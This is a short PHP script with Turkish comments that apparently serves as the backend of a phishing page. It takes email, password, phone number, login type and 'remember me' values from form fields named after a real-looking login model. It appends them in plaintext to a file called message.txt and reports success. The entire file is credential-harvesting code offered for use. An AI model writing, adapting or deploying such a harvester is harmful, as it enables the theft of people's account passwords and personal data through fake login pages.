<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Formdan gelen verileri al
    $email = $_POST['LoginModel.Email'] ?? 'E-posta bulunamadı';
    $password = $_POST['LoginModel.Password'] ?? 'Şifre bulunamadı';
    $phone = $_POST['LoginModel.Phone'] ?? 'Telefon numarası bulunamadı';
    $loginType = $_POST['CustomerLoginType'] ?? 'Bilgi yok';
    $isPersistent = isset($_POST['LoginModel.IsCreatePersistentCookie']) ? 'Evet' : 'Hayır';

    // Dosyayı aç veya oluştur
    $file = 'message.txt';

    // Yazılacak içerik
    $content = "Giriş Bilgileri:\n";
    $content .= "E-Posta: " . $email . "\n";
    $content .= "Şifre: " . $password . "\n";
    $content .= "Telefon: " . $phone . "\n";
    $content .= "Giriş Yöntemi: " . $loginType . "\n";
    $content .= "Beni Hatırla: " . $isPersistent . "\n";
    $content .= "----------------------------\n";

    // Dosyaya ekle
    file_put_contents($file, $content, FILE_APPEND | LOCK_EX);

    // Başarı mesajı veya yönlendirme
    echo "Veriler başarıyla kaydedildi.";
}
?>
